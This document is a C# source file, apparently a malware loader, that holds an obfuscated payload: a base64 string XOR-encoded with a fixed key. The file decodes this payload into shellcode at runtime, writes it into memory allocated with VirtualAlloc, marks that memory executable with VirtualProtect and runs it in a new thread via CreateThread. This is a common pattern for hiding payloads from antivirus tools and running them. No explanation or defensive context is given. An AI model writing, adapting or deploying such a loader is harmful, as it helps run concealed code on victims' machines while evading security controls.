using System;
using System.Runtime.InteropServices;
using System.Text;
public class PlainJane
{
    private static UInt32 MEM_COMMIT = 0x1000;
    private static UInt32 PAGE_READWRITE = 0x04;
    private static UInt32 PAGE_EXECUTE_READ = 0x20;
    [DllImport("kernel32")]
    private static extern UInt32 VirtualAlloc(UInt32 lpStartAddr, UInt32 size, UInt32 flAllocationType, UInt32 flProtect);
    [DllImport("kernel32")]
    private static extern bool VirtualProtect(IntPtr address, UInt32 size, UInt32 newProtect, out UInt32 oldProtect);
    [DllImport("kernel32")]
    private static extern IntPtr CreateThread(
        UInt32 lpThreadAttributes,
        UInt32 dwStackSize,
        UInt32 lpStartAddress,
        IntPtr param,
        UInt32 dwCreationFlags,
        ref UInt32 lpThreadId
    );
    [DllImport("kernel32")]
    private static extern UInt32 WaitForSingleObject(IntPtr hHandle, UInt32 dwMilliseconds);
    public void Execute() {
        string raw = @"WTYKJi8SLHQDMwE2OAw6LD1dOTofSCooB2IkYDNJJjUxWBwMHgYwYgQ9Gw0IEiRGEzcnCjE+MA9gGjIeIE0XNisaGX4KMxsXMDcSLQctMB8jIBc/JxIlYTNKBANBFQgNPRYrATcdOh1BZRd3IA1fGA0VEiAwCiEJEB8EUggAPwRvPAYWIiwpBWReGQEyPBYpOREad2pOHB8cGDAWPTkpJjw/Fwc3BQFUDxxAPS1eQSY9FDQ/HC9SCgw+OwUbPQdpFDhNNwIrEAASADotQWo4TWhLIQ4gXjYTNSgIGhMYBUpfBSNhOx0hDiBdER45CzkMQDEmJy8SLEMULgcSIgIIKAEkEAQ7Sy0OP2EFBg48JSMiAzYsMFwcGSBLOTYgOTddCS8Eay87MhEFXx9/ICxSIAwFIAYJMh8RODcUKDcHMjg4MQcxIwUjBQMuPTIjFT0+NTgqJBQxJlYMPj9PFBQHDyRdQR81KzZ+FTE5KyAEP0Y4PFYTJl0qHQVeQQ8kFDJVPBVVBglKCx0UKk1yAjtJGBIuLVQKYzt3FiwpFBE3Li02AjJ7J0ohCDc+O0AMSyURICk2FzA6PiITFCYfPTg/VBcQKTM7NxQJBioiFxMuJR04FSd6Oz8LERcVLgs1BwgAF0kxDDgFAgUWLiUCEQRBMwVfHCMXSw88NBskAA48KS04XggCDV8iHBRIKQs7YgUDDS0fIywESQ8aXCoVOxUtDz0bOHQPPQcCHDVXAHtVLwcOFS0KLxchUjI8IQ4gXhwTAgESPyAqV1JBajpiOx0fPBQmOT0VLTsHQj4MIDsUAlMMFwdrJx9OAHtVLhkjSC0xOD4KQRgSB21aVi8BIyQtGBcwBDEvEi9aCCoua0E/VxEAXyADQDwUJC8SL0QLPQgbMC45BjUtOQwnOCExDxUEXg9RN3VENTYTAVgWIyBLBCQnEix0D0s1NTAfGQ1gGlcbHhohVRRnHn0bGSAcAicgKwMhNitAPhVKQXxVTRUuBC84BTFyGAYxfTkqVx0gKQZ0L1UsaxoDIjYVKihiRyheWA==";
        byte[] shellcode = Convert.FromBase64String(pjladd("vycenSm5ZzoZuoxGTlxM", Base64Decode(raw)));
        UInt32 funcAddr = VirtualAlloc(0, (UInt32)shellcode.Length, MEM_COMMIT, PAGE_READWRITE);
        Marshal.Copy(shellcode, 0, (IntPtr)(funcAddr), shellcode.Length);
        UInt32 oldProtect;
        VirtualProtect((IntPtr)(funcAddr), (UInt32)shellcode.Length, PAGE_EXECUTE_READ, out oldProtect);
        IntPtr hThread = IntPtr.Zero;
        UInt32 threadId = 0;
        IntPtr pinfo = IntPtr.Zero;
        hThread = CreateThread(0, 0, funcAddr, pinfo, 0, ref threadId);
        WaitForSingleObject(hThread, 0xFFFFFFFF);
    }

    public static string pjladd(string key, string input)
    {
        StringBuilder sb = new StringBuilder();
        for(int i=0; i < input.Length; i++)
            sb.Append((char)(input[i] ^ key[(i % key.Length)]));
        String result = sb.ToString();
        return result;
    }

    public static string Base64Encode(string text) {
       return System.Convert.ToBase64String(System.Text.Encoding.UTF8.GetBytes(text));
    }

    public static string Base64Decode(string encodedtext) {
	    return System.Text.Encoding.UTF8.GetString(System.Convert.FromBase64String(encodedtext));
    }
}